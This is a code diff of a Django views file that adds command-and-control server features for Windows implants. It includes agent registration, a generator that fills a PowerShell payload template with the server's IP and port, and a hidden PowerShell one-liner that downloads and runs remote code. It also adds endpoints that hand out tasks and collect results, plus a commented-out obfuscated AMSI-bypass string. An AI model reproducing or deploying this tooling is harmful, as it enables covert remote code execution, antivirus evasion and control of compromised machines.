@@ -1,8 +1,197 @@
-import imp
 from unicodedata import name
+from urllib import request, response
+from cairo import Status
+from dbus import Interface
 from django.shortcuts import render
-from blog.Modules.windows.screenshot import ScreenShot
 from blog.Modules.windows.DirectoryListing import DirectoryListing
+# from blog.Modules.windows.listenershelpers import startListener
+from .forms import *
+from .models import *
+from django.http import HttpResponseRedirect
+import netifaces
+import os
+import random
+import string
+from django.http import HttpResponse
+from django.views import View
+from flask import Flask
+import threading
+import sys
+from multiprocessing import Process
+
+
+listen_path = os.path.dirname(os.path.abspath(__file__))+"/Modules/windows/data/listeners/"
+app         = Flask(__name__)
+port = 8000
+
+
+# def http_method_list(methods):
+#     def http_methods_decorator(func):
+#         def function_wrapper(self, request, **kwargs):
+#             methods = [method.upper() for method in methods]
+#             if not request.method.upper() in methods:
+#                 return HttpResponse(status=405) # not allowed
+
+#             return func(self, request, **kwargs)
+#         return function_wrapper
+#     return http_methods_decorator
+
+
+def get_client_ip(request):
+    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+    if x_forwarded_for:
+        ip = x_forwarded_for.split(',')[0]
+    else:
+        ip = request.META.get('REMOTE_ADDR')
+    return ip
+
+
+
+def registerAgent(request):
+    if request.method=='POST':
+        hostname = request.POST['hname']
+        if Agent.objects.filter(hname = hostname).exists():
+            data = Agent.objects.get(hname = hostname)
+            agentname = data.name
+        else:
+            agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) #ASFASA
+        remoteip = (get_client_ip(request))
+        eth = request.POST['eth']
+        if Agent.objects.filter(hname = hostname).exists():
+            pass
+        else:    
+            s=Agent(name=agentname, ip = remoteip, hname= hostname )
+            s.save() 
+        Listener.agent(agentname,remoteip, eth)
+
+        return HttpResponse(agentname)
+    else:
+        return ('',204)
+
+    
+class Listener():
+    class PostListener(View):
+        def post(self,request):
+            form = listener(request.POST)
+            if form.is_valid():
+                form.save()
+            # netifaces.ifaddresses(interface)
+            # ip= netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'] # need or not to write into DB   
+            # s = ListenerForm(Interface = ip)
+            # s.save()
+            return render(request, 'blog/listeners.html' , {'form':form})
+
+
+        def get(self,request):
+            form = listener()
+            return render(request, 'blog/listeners.html' , {'form':form})
+
+    class payloadGen(View):
+        def post(self,request):
+            eth = request.POST['interface']
+            netifaces.ifaddresses(eth)
+            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
+            output_path= "/tmp/{}".format(eth)
+            with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
+                payload = p.read()
+            payload = payload.replace('REPLACE_IP',ip)
+            payload = payload.replace('REPLACE_PORT',str(port))
+            payload = payload.replace('REPLACE_INTERFACE',eth)
+            with open(output_path,"wt") as R:
+                R.write(payload)
+
+            with open(listen_path+"/{}".format(eth),"wt") as R:
+                R.write(payload)
+
+            oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), eth)
+            return render(request,'blog/payload-Gen.html', {'payloadline':oneliner})
+
+        def get(self,request):
+            return render(request,'blog/payload-Gen.html')
+
+
+    class agent():   ####### need to take ETH from the GUI user
+        def __init__(self, name, remote , eth):
+
+            self.name      = name
+            # self.listener  = listener
+            self.remote  = remote
+            self.eth = eth
+            # self.key       = key
+            self.sleept    = 3
+            self.Path      = listen_path+"agents/{}/".format(self.name)
+            self.tasksPath = "{}tasks".format(self.Path, self.name)
+            netifaces.ifaddresses(eth)
+            self.eth_ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
+            
+            if os.path.exists(self.Path) == False:
+                os.mkdir(self.Path)
+     
+        def run(eth_ip,port):      ######multi threading with django or flask
+            app.logger.disabled = True
+            app.run(port=port, host=eth_ip)
+            
+        def start(self):
+            server = Process(target=Listener.agent.run(self.eth_ip,port))  
+            # get Ethernet from GUI User 
+            cli = sys.modules['flask.cli']
+            cli.show_server_banner = lambda *x: None
+            daemon = threading.Thread(name = self.name,
+                                            target = server.start,
+                                            args= ())
+            daemon.daemon = True
+            daemon.start()
+            try:
+                Listener.agent.start(self)
+                print("Listener started.")
+            except:
+                print("Failed. Check your options.")
+                
+
+        def sendScript(request , eth=''):
+            netifaces.ifaddresses(eth)
+            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
+            # amsi     = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
+            oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(ip,str(port),eth)
+            return HttpResponse(oneliner)
+
+
+        def sendFile(request, eth=''):
+            output_path= "/tmp/{}".format(eth)
+            f    = open("{}".format(output_path), "rt")
+            data = f.read()
+            f.close()
+            return HttpResponse(data)
+
+
+        def serveTasks(request,name=''):
+            tasksPath = listen_path+"agents/{}/tasks".format(name)
+            if os.path.exists(tasksPath):
+                with open(tasksPath, "r") as f:
+                    task = f.read()
+                    
+                os.remove(tasksPath)    
+                return HttpResponse(task)
+            else:
+                return HttpResponse('')
+
+
+        def receiveResults(request,name=''):
+            if request.method == 'POST':
+                resultspath = listen_path+"agents/{}/results".format(name)
+                result = request.POST['result']
+                with open(resultspath,'a') as r:
+                    r.write(result) 
+                    r.close()
+                return HttpResponse('')
+            else:
+                return HttpResponse('')
+
+
+
+
+
+
 
 def LoginPage(request):
     return render(request  , 'blog/login.html' )
@@ -13,10 +202,12 @@ def HomePage(request):
 def ListenersPage(request):
     return render(request  , 'blog/listeners.html' )
 
-def ScreenShotMethod(request):
-    ScreenShot()    
-    return render(request  , 'blog/listeners.html' )
-
 def dirlist(request):
     DirectoryListing(request.POST["dir"])         
     return render(request  , 'blog/listeners.html' )
+
+def TestPage(request):
+	#oListener =  Listener("test55" , "4252" , "192.168.1.15"); 
+	return render(request  , 'blog/start-listener.html' )
+
+
